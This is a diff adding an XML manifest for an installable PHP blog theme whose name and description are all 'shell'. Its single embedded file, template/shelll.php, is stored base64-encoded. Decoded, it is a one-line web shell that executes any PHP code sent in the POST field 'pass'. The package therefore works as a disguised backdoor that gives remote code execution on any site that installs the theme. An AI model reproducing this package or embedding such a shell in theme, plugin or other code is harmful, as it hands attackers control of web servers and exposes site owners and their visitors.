@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="utf-8"?><app version="php" type="theme"><id>aymFreeFive</id><name>shell</name><url>https://xxx.xxx</url><note>shell</note><description>shell</description><path>settings/main.php</path><include>include.php</include><level>1</level><author><name>shell</name><email>iyuanma@qq.com</email><url>https://xxx.xxx/</url></author><source><name>shell</name><email>xxx@qq.com</email><url>https://xxx.xxx</url></source><adapted>1</adapted><version>1</version><pubdate>2024-12-05</pubdate><modified>2024-12-05</modified><price>0</price><phpver>5.5</phpver><advanced><dependency></dependency><rewritefunctions></rewritefunctions><existsfunctions></existsfunctions>
+<conflict></conflict></advanced><sidebars><sidebar1></sidebar1><sidebar2></sidebar2><sidebar3></sidebar3><sidebar4></sidebar4><sidebar5></sidebar5><sidebar6></sidebar6><sidebar7></sidebar7><sidebar8></sidebar8><sidebar9></sidebar9></sidebars>
+<folder><path>shell/scripts/</path></folder>
+<folder><path>shell/settings/</path></folder>
+<folder><path>shell/style/images/</path></folder>
+<folder><path>shell/style/</path></folder>
+<folder><path>shell/template/</path></folder>
+<file><path>shell/template/shelll.php</path><stream>PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pID8+</stream></file>
+<verify>aHR0cDovL2xvY2FsaG9zdC9ia2IvCkM6L3hhbXBwL2h0ZG9jcy9ia2Iv</verify></app>
